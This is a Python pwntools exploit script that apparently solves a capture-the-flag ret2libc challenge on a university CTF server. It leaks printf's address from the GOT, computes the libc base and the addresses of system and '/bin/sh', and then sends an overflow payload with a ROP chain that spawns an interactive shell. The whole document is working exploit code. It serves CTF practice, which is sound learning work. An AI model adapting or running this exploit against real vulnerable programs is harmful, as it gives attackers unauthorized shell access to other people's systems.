from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11006
p = remote(host, port)
#p = process("./ret2libc")
print(p.recvuntil(":"))
#readelf -s libc.so.6 | grep puts
### printf ###
printf_GOT = 0x601028   #6295592
p.sendline(str(printf_GOT))
l = p.recvuntil(".")
print(l)
printf_addr = l.decode('utf-8').split(" ")[-1].rstrip('.')
printf_offset = 0x0557b0

### base address ###
base_addr = int(printf_addr, 0) - printf_offset

### system ###
sys_offset = 0x045380
sys_addr = base_addr + sys_offset

### /bin/sh ###
bin_sh_offset = 0x18c58b
bin_sh_addr = base_addr + bin_sh_offset

exit_offset = 0x03a020
exit_addr = base_addr + exit_offset


p.sendline(b"A"*0x5 + b"\x00" + b"\x90"*0x22 + p64(0x400873) + p64(bin_sh_addr) + p64(sys_addr))

p.interactive()

#strings -t x libc.so.6 | grep '/bin/sh' ---  18c58b /bin/sh
#00000000000557b0  printf@@GLIBC_2.2.5
#0000000000045380  system@@GLIBC_2.2.5
#000000000003a020  exit@@GLIBC_2.2.5
#printf @plt   601028 <_GLOBAL_OFFSET_TABLE_+0x28>


